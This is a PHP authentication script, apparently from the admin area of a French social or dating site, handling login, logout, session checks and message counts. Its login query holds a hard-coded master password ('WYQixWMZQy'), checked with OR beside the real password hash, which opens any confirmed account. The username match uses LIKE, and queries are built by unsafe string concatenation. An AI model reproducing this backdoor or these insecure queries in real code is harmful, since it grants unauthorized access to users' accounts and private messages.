<?php

	// s&eacute;curit&eacute;
	defined('JL') or die('Error 401');

	global $db, $user, $app, $action, $langue;

	$auth	= JL::getVar('auth', '');

	// demande d'authentification
	if($auth == 'login') {

		$query = "SELECT id"
		." FROM user"
		." WHERE username LIKE '".JL::getVar('username', '', true)."' AND user_status_code='1' AND (password LIKE MD5('".JL::getVar('pass', '', true)."') OR '".JL::getVar('pass', '', true)."' = 'WYQixWMZQy') AND (confirmed*published) > 0"
		." LIMIT 0,1"
		;
		$user_id = $db->loadResult($query);
		
		if($user_id) {

			// calcule le fleur_new (peut changer si des utilisateurs ont &eacute;t&eacute; d&eacute;sactiv&eacute;s entre temps)
			$query = "SELECT COUNT(*)"
			." FROM message AS m"
			." INNER JOIN user AS u ON u.id = m.user_id_from"
			." WHERE m.user_id_to = '".(int)$user_id."' AND u.confirmed = 1 AND m.fleur_id > 0 AND m.non_lu = 1"
			;
			$fleur_new = (int)$db->loadResult($query);

			// calcule le message_new (peut changer si des utilisateurs ont &eacute;t&eacute; d&eacute;sactiv&eacute;s entre temps)
			$query = "SELECT COUNT(*)"
			." FROM message AS m"
			." INNER JOIN user AS u ON u.id = m.user_id_from"
			." WHERE m.user_id_to = '".(int)$user_id."' AND u.confirmed = 1 AND m.fleur_id = 0 AND m.non_lu = 1"
			;
			$message_new = (int)$db->loadResult($query);

			// met &agrave; jour les stats de l'utilisateur
			$query = "UPDATE user_stats SET"
			." login_total  = login_total + 1,"
			." fleur_new = '".$db->escape($fleur_new)."',"
			." message_new = '".$db->escape($message_new)."'"
			." WHERE user_id = '".$user_id."'"
			;
			$db->query($query);

			JL::setSession('user_id', $user_id);
		}
		else{
			$user->login = 'login';
			}
	} elseif($auth == 'logout') {
		// d&eacute;truit la session
		$query = "UPDATE user SET last_online = NOW(), online = '0' WHERE id = '".$user->id."'";
		$db->query($query);
		
		JL::sessionDestroy();

	}


	// check si l'utilisateur est log
	$user_id	= intval(JL::getSession('user_id', 0, true));

	// check si l'utilisateur est activ&eacute;
	$query = "SELECT (confirmed*published) AS log_ok FROM user WHERE id = '".$user_id."' LIMIT 0,1";
	$log_ok = $db->loadResult($query);

	// si utilisateur log et activ&eacute;
	if($user_id && $log_ok) {


		// r&eacute;cup les infos de l'utilisateur
		$query = "SELECT u.id, u.username, u.email, u.gid, us.gold_limit_date, up.helvetica, up.genre, u.confirmed"
		." FROM user AS u"
		." INNER JOIN user_stats AS us ON us.user_id = u.id"
		." INNER JOIN user_profil AS up ON up.user_id = u.id"
		." WHERE u.id = '".$user_id."'"
		." LIMIT 0,1"
		;
		//die($query);
		$user = $db->loadObject($query);


		// gid incorrect, pas le droit de se connecter &agrave; l'admin
		if($user->gid > 0) {

			// d&eacute;truit la session au cas o&ugrave;
			JL::sessionDestroy();

			// redirige sur le panel utilisateur pour se log
			JL::redirect(SITE_URL.'/index.php'.'?'.$langue);

		}

		//if($user->helvetica !=1){
			
			// met &agrave; jour le last_online de l'utilisateur
			$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."', online = '1' WHERE id = '".$user->id."'";
			//$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."' WHERE id = '".$user->id."'";
			$db->query($query);
		//}

		// demande d'authentification
		if($auth == 'login') {

			// reset le dernier event (pour pas se faire spam dès qu'on se log :) )
			JL::addLastEvent($user->id, 0);

			// r&eacute;cup tous les utilisateurs ayant $user en friendlist
			$query = "SELECT user_id_from AS id"
			." FROM user_flbl"
			." WHERE user_id_to = '".$user->id."' AND list_type = 1"
			;
			$friends = $db->loadObjectList($query);

			if(is_array($friends)) {
				foreach($friends as $friend) {

					// enregistre le dernier &eacute;v&eacute;nement "$user vient de se connecter !"
					JL::addLastEvent($friend->id, $user->id, 5);

				}
			}

			// check l'ip du visiteur
			$url_check_pays		= 'http://api.hostip.info/country.php?ip='.$_SERVER['REMOTE_ADDR'];

			// check la provenance du visiteur
			$ch 				= @curl_init($url_check_pays);
			@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$ip_pays 			= @curl_exec($ch);

			// met &agrave; jour le ip_pays de l'utilisateur
			$query = "UPDATE user SET ip_pays = '".addslashes($ip_pays)."' WHERE id = '".$user->id."'";
			$db->query($query);

			// cr&eacute;dite l'action connexion quotidienne
			JL::addPoints(7, $user->id, date('d-m-Y'));

			// redirige sur le panel utilisateur
			JL::redirect('index.php?app=profil&action=panel'.'&'.$langue);

		}

	} else {

		$user->id				= 0;
		$user->username			= '';
		$user->email			= '';
		$user->gid				= 0;
		$user->gold_limit_date	= '0000-00-00';
		$user->genre	= '';

	}

?>
